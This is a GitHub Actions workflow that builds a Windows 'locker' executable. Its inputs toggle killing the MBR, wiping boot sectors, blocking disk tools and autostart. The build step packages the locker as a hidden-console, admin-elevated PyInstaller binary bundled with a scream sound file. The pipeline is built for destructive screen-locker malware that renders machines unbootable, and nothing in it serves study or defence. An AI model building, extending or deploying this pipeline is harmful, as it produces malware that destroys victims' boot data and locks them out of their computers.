name: Build Locker
on:
  workflow_dispatch:
    inputs:
      password:
        description: 'Unlock password (plain)'
        required: true
        default: '8841'
      autostart:
        description: 'Autostart? (true/false)'
        required: true
        default: 'true'
      kill_mbr:
        description: 'Kill MBR? (true/false)'
        required: true
        default: 'true'
      wipe_boot:
        description: 'Wipe boot sectors? (true/false)'
        required: true
        default: 'true'
      block_live_usb:
        description: 'Block disk tools? (true/false)'
        required: true
        default: 'true'

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install deps
        run: |
          python -m pip install --upgrade pip
          pip install pillow keyboard psutil cryptography pygame pyinstaller

      - name: Generate locker.py
        env:
          INPUT_PASSWORD: ${{ inputs.password }}
          INPUT_AUTOSTART: ${{ inputs.autostart }}
          INPUT_KILL_MBR: ${{ inputs.kill_mbr }}
          INPUT_WIPE_BOOT: ${{ inputs.wipe_boot }}
          INPUT_BLOCK_LIVE_USB: ${{ inputs.block_live_usb }}
        run: python locker_builder.py

      - name: Verify locker.py
        run: python -c "import ast; ast.parse(open('locker.py', encoding='utf-8').read())"

      - name: Build EXE
        run: |
          pyinstaller --noconsole --onefile --uac-admin --add-data "assets;assets" --add-data "scream.mp3;." --name locker locker.py

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: locker-exe
          path: dist/locker.exe
